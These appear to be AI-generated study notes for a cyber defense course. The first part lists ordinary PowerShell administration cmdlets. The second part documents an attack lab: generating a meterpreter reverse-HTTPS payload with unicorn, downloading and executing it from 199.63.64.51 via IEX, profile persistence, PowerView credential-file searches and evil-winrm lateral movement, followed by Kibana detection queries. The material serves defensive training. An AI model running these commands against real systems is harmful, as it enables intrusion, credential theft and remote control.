### CDAH-M11L5-PowerShell System Administration

Here is a list of every PowerShell command (cmdlet) mentioned in m11-m15_commands.md, along with syntax examples and descriptions of their switches/parameters:

---

### 1. Get-WinEvent

**Purpose:** Retrieves event logs from local or remote computers.

**Syntax Examples:**
```powershell
# List all event log providers on a remote computer
Get-WinEvent -ComputerName bp-wkstn-10 -ListLog * | Format-Table LogName, IsEnabled

# Detailed info for a specific log provider
Get-WinEvent -ComputerName bp-wkstn-10 -ListLog Microsoft-Windows-PowerShell/Operational | Format-List -Property *

# List all logs from a specific provider
Get-WinEvent -ComputerName bp-wkstn-10 -LogName Microsoft-Windows-PowerShell/Operational
```

**Key Parameters:**
- `-ComputerName <String>`: Specifies the target computer.
- `-ListLog <String>`: Lists event log providers (use * for all).
- `-LogName <String>`: Specifies the log name to query.
- Other parameters: `-MaxEvents`, `-FilterXPath`, `-FilterHashtable`, `-Credential`, etc.

---

### 2. Get-Process

**Purpose:** Retrieves information about processes running on a local (or remote) computer.

**Syntax Examples:**
```powershell
# List all processes with specific fields
Get-Process | Format-Table Id, Name, Path

# Detailed information on specific processes
Get-Process conhost, lsass | Format-List *

# Get version info for a process
Get-Process conhost -FileVersionInfo 2>$null
```

**Key Parameters:**
- `-Name <String[]>`: Process names to retrieve.
- `-Id <Int32[]>`: Process IDs to retrieve.
- `-FileVersionInfo`: Returns file version information.
- Other parameters: `-ComputerName`, `-Module`, `-IncludeUserName`, etc.

---

### 3. Get-Service

**Purpose:** Retrieves status of services on a local (or remote) computer.

**Syntax Examples:**
```powershell
# List all running services
Get-Service | Where-Object {$_.Status -eq "Running"}

# List running services starting with 'net'
Get-Service -Name "net*" | Where-Object {$_.Status -eq "Running"}

# Details for a specific service
Get-Service -Name Netlogon | Format-List *
```

**Key Parameters:**
- `-Name <String[]>`: Service names (wildcards supported).
- `-DisplayName <String[]>`: Service display names.
- `-RequiredServices`: Lists required services.
- Other parameters: `-DependentServices`, `-ComputerName`, etc.

---

### 4. Get-HotFix

**Purpose:** Displays installed hotfixes on a local or remote computer.

**Syntax Examples:**
```powershell
# All hotfixes on a remote computer
Get-HotFix -ComputerName bp-wkstn-9

# Security hotfixes, sorted
Get-HotFix -Description Security* -ComputerName bp-wkstn-9 | Sort-Object -Property InstalledOn

# Details about a specific hotfix
Get-HotFix -Id KB2847927 -ComputerName bp-wkstn-9 | Format-List *
```

**Key Parameters:**
- `-ComputerName <String[]>`: Remote computer(s).
- `-Id <String[]>`: Hotfix ID(s), e.g., KB123456.
- `-Description <String>`: Description filter (supports wildcards).
- `-ServicePack <String>`: Service pack filter.

---

### 5. Get-Help

**Purpose:** Displays help for cmdlets.

**Syntax Example:**
```powershell
Get-Help Get-HotFix
```

**Key Parameters:**
- `-Name <String>`: Name of the cmdlet to get help for.
- `-Detailed`, `-Full`, `-Examples`, etc.

---

### 6. Get-GPO

**Purpose:** Retrieves Group Policy Objects in a domain.

**Syntax Example:**
```powershell
Get-GPO -All -Domain "energy.lan"
```

**Key Parameters:**
- `-All`: Retrieves all GPOs.
- `-Domain <String>`: Domain to query.
- `-Name <String>`: GPO name.
- `-Guid <Guid>`: GPO GUID.

---

### 7. New-GPO

**Purpose:** Creates a new GPO.

**Syntax Example:**
```powershell
New-GPO -Name "ScreenSaverTimeout" -Comment "This sets the screen saver timeout to 5min."
```

**Key Parameters:**
- `-Name <String>`: Name of the new GPO.
- `-Comment <String>`: Description.
- `-Domain <String>`: Domain in which to create.

---

### 8. Set-GPRegistryValue

**Purpose:** Sets a registry-based policy in a GPO.

**Syntax Example:**
```powershell
Set-GPRegistryValue -Name "ScreenSaverTimeout" -Key "HKCU\Software\Policies\Microsoft\Windows\Control Panel\Desktop" -ValueName ScreenSaveTimeOut -Type String -Value 300
```

**Key Parameters:**
- `-Name <String>`: GPO name.
- `-Key <String>`: Registry key.
- `-ValueName <String>`: Registry value name.
- `-Type <String>`: Value type (e.g., String, DWord).
- `-Value <Object>`: Value to set.

---

### 9. New-GPLink

**Purpose:** Links a GPO to an OU or domain.

**Syntax Example:**
```powershell
New-GPLink -Name "ScreenSaverTimeout" -Target "ou=bp,dc=energy,dc=lan"
```

**Key Parameters:**
- `-Name <String>`: GPO name.
- `-Target <String>`: OU or domain to link.

---

### 10. Get-GPOReport

**Purpose:** Generates a report for a GPO.

**Syntax Example:**
```powershell
Get-GPOReport -Name "ScreenSaverTimeout" -ReportType HTML -Path "C:\Users\trainee\Desktop\gporeport.html"
```

**Key Parameters:**
- `-Name <String>`: GPO name.
- `-ReportType <String>`: Report format (HTML, XML).
- `-Path <String>`: Output file path.

---

### 11. Get-Module

**Purpose:** Lists modules loaded in the current session or available on the system.

**Syntax Example:**
```powershell
Get-Module
```

**Key Parameters:**
- `-Name <String[]>`: Module name(s).
- `-ListAvailable`: List all available modules.

---

### 12. Get-Command

**Purpose:** Lists cmdlets and functions.

**Syntax Example:**
```powershell
Get-Command
```

**Key Parameters:**
- `-Name <String[]>`: Command name(s).
- `-Module <String[]>`: Filter by module.
- `-CommandType <CommandTypes>`: E.g., Cmdlet, Function.

---

### 13. Get-Item

**Purpose:** Gets an item at a specified location (e.g., file or registry key).

**Syntax Example:**
```powershell
Get-Item HKLM:\Software\Microsoft\Windows\CurrentVersion\Run
```

**Key Parameters:**
- `-Path <String[]>`: Path(s) to the item.

---

### 14. New-ItemProperty

**Purpose:** Creates a new property for an item (e.g., registry entry).

**Syntax Example:**
```powershell
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Notepad" -Value "%windir%\system32\notepad.exe"
```

**Key Parameters:**
- `-Path <String>`: Path to the item.
- `-Name <String>`: Property name.
- `-Value <Object>`: Value to set.

---

### 15. Remove-ItemProperty

**Purpose:** Deletes a property from an item.

**Syntax Example:**
```powershell
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Notepad"
```

**Key Parameters:**
- `-Path <String>`: Path to item.
- `-Name <String>`: Property name.

---

### 16. Get-NetFirewallProfile

**Purpose:** Gets firewall profiles on the local computer.

**Syntax Example:**
```powershell
Get-NetFirewallProfile -All
```

**Key Parameters:**
- `-Name <String[]>`: Profile name(s) (Domain, Private, Public).
- `-All`: All profiles.

---

### 17. Get-NetFirewallRule

**Purpose:** Gets firewall rules.

**Syntax Examples:**
```powershell
# All rules in the domain profile
Get-NetFirewallProfile -Name Domain | Get-NetFirewallRule

# Get a specific rule
Get-NetFirewallRule -DisplayName "Block Outbound Port 1337"
```

**Key Parameters:**
- `-DisplayName <String[]>`: Rule display names.
- `-Name <String[]>`: Rule names.
- Filtering, e.g., `-Direction`, `-Profile`, etc.

---

### 18. New-NetFirewallRule

**Purpose:** Creates a new firewall rule.

**Syntax Example:**
```powershell
New-NetFirewallRule -DisplayName "Block Outbound Port 1337" -Direction Outbound -LocalPort 1337 -Protocol TCP -Action Block -Profile Domain
```

**Key Parameters:**
- `-DisplayName <String>`: Name for the rule.
- `-Direction <Direction>`: Inbound/Outbound.
- `-LocalPort <UInt16[]>`: Port(s).
- `-Protocol <String>`: Protocol (TCP/UDP).
- `-Action <Action>`: Allow/Block.
- `-Profile <String[]>`: Network profile(s).

---

### 19. Disable-NetFirewallRule

**Purpose:** Disables a firewall rule.

**Syntax Example:**
```powershell
Disable-NetFirewallRule -DisplayName "Block Outbound Port 1337"
```

**Key Parameters:**
- `-DisplayName <String[]>`: Rule display names.
- `-Name <String[]>`: Rule names.

---

If you need expanded parameter lists or more details for any specific cmdlet, let me know!

### CDAH-M12L1-Weaponizing PowerShell & Attack Frameworks

Here are all the PowerShell and Linux commands found in m11-m15_dump.md, along with explanations, syntax examples, and any switches/parameters used:

---

## PowerShell Commands

### 1. Invoke-AtomicTest

- **Description:** Runs Atomic Red Team tests for a specific MITRE ATT&CK technique.
- **Syntax Example:**  
  Invoke-AtomicTest T1059.001 -ShowDetailsBrief  
  Invoke-AtomicTest T1059.001 -CheckPrereqs  
  Invoke-AtomicTest T1059.001
- **Parameters/Switches:**
  - T1059.001 — Specifies the technique ID to test.
  - -ShowDetailsBrief — Shows a brief summary of available tests.
  - -CheckPrereqs — Checks if the prerequisites for each test are met.

---

### 2. cd (Change Directory)

- **Description:** Changes the current directory.
- **Syntax Example:**  
  cd /home/trainee/unicorn

---

### 3. sed

- **Description:** Stream editor for filtering and transforming text (Linux).
- **Syntax Example:**  
  sed -z -i 's/\n/\r\n/g;s/powershell/powershell -noprofile/g' powershell_attack.txt
- **Parameters/Switches:**
  - -z — Treats input as a set of lines separated by ASCII NUL.
  - -i — Edits files in-place.

---

### 4. Out-File

- **Description:** Sends output to a file.
- **Syntax Example:**  
  $string | Out-File -FilePath $profile -Append
- **Parameters/Switches:**
  - -FilePath — Specifies the file to write to.
  - -Append — Appends to the file instead of overwriting.

---

### 5. echo

- **Description:** Displays a string or variable's value.
- **Syntax Example:**  
  echo $profile

---

### 6. Test-Path

- **Description:** Checks if a path exists.
- **Syntax Example:**  
  Test-Path $profile

---

### 7. New-Item

- **Description:** Creates a new item (file or folder).
- **Syntax Example:**  
  New-Item -Path $profile -Type file -Force
- **Parameters/Switches:**
  - -Path — Specifies the path.
  - -Type — Type of item (file/folder).
  - -Force — Creates item even if it exists.

---

### 8. Invoke-WebRequest

- **Description:** Downloads content from the web.
- **Syntax Example:**  
  (Invoke-WebRequest -URI "http://199.63.64.51:8000/powershell_attack.txt").Content | Out-File -FilePath "C:\Windows\Temp\launch.bat"
- **Parameters/Switches:**
  - -URI — The URL to download from.

---

### 9. Start-Process

- **Description:** Starts a new process.
- **Syntax Example:**  
  Start-Process -FilePath "powershell" -ArgumentList "-noprofile -command `"IEX(GC C:\Windows\Temp\launch.bat -Raw)`""
- **Parameters/Switches:**
  - -FilePath — Executable to run.
  - -ArgumentList — Arguments to pass.

---

### 10. Get-Content

- **Description:** Reads content from a file.
- **Syntax Example:**  
  Get-Content C:\Users\trainee\Documents\backup_pass.txt

---

### 11. Set-ExecutionPolicy

- **Description:** Changes the user preference for the PowerShell script execution policy.
- **Syntax Example:**  
  Set-ExecutionPolicy Bypass

---

### 12. . (Dot Sourcing)

- **Description:** Loads a PowerShell script into the current session.
- **Syntax Example:**  
  . .\PowerView.ps1

---

### 13. Find-InterestingFile (PowerView function)

- **Description:** Searches for files that may contain credentials.
- **Syntax Example:**  
  Find-InterestingFile -Path "C:\Users"
- **Parameters/Switches:**
  - -Path — Path to search under.

---

### 14. $credentials = Get-Credential

- **Description:** Prompts for credentials and stores them in a variable.
- **Syntax Example:**  
  $credentials = Get-Credential

---

### 15. $session = New-PSSession

- **Description:** Creates a persistent PowerShell session to a remote computer.
- **Syntax Example:**  
  $session = New-PSSession -ComputerName eng-wkstn-2 -Credential $credentials
- **Parameters/Switches:**
  - -ComputerName — Name of remote computer.
  - -Credential — Credentials object.

---

### 16. Enter-PSSession

- **Description:** Starts an interactive session with a remote computer.
- **Syntax Example:**  
  Enter-PSSession $session

---

## Linux/Metasploit/Evil-WinRM Commands

### 1. ./unicorn.py

- **Description:** Generates shellcode payloads for PowerShell attacks.
- **Syntax Example:**  
  ./unicorn.py windows/meterpreter/reverse_https 199.63.64.51 5555

---

### 2. sudo msfconsole -r unicorn.rc

- **Description:** Starts Metasploit Console loading a resource script.
- **Syntax Example:**  
  sudo msfconsole -r unicorn.rc

---

### 3. python3 -m http.server

- **Description:** Starts a simple HTTP server in the current directory.
- **Syntax Example:**  
  python3 -m http.server

---

### 4. sessions -i 1 (Metasploit)

- **Description:** Interacts with a specific Metasploit session.
- **Syntax Example:**  
  sessions -i 1

---

### 5. load stdapi (Meterpreter)

- **Description:** Loads the stdapi extension in Meterpreter for standard commands.
- **Syntax Example:**  
  meterpreter > load stdapi

---

### 6. upload (Meterpreter)

- **Description:** Uploads a file to the target machine.
- **Syntax Example:**  
  meterpreter > upload /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 "C:\Windows\Temp\PowerView.ps1"

---

### 7. shell (Meterpreter)

- **Description:** Opens a shell on the victim machine.
- **Syntax Example:**  
  meterpreter > shell

---

### 8. evil-winrm

- **Description:** Evil-WinRM is a tool for remote access to Windows using WinRM.
- **Syntax Example:**  
  evil-winrm -i 172.16.4.3 -u "john.doe"
- **Parameters/Switches:**
  - -i — Target IP address.
  - -u — Username.

---

## Kibana/ElasticSearch Queries

- **event.code:1 and process.executable :*powershell.exe and process.parent.executable :*powershell.exe**  
  Finds PowerShell processes started by other PowerShell processes.

- **event.code:4104 and message:"*PowerView*"**  
  Finds script block execution logs containing PowerView.

- **event.code: 4648 and winlog.event_data.TargetInfo:HTTP***  
  Finds logons with explicit credentials for HTTP (WinRM).

- **event.code: 91**  
  Finds WinRM resource allocation events.

- **event.code: 4624 and winlog.event_data.LogonType:3**  
  Finds successful network logons (potential lateral movement).

---

Let me know if you want detailed examples for any specific command or further breakdowns!
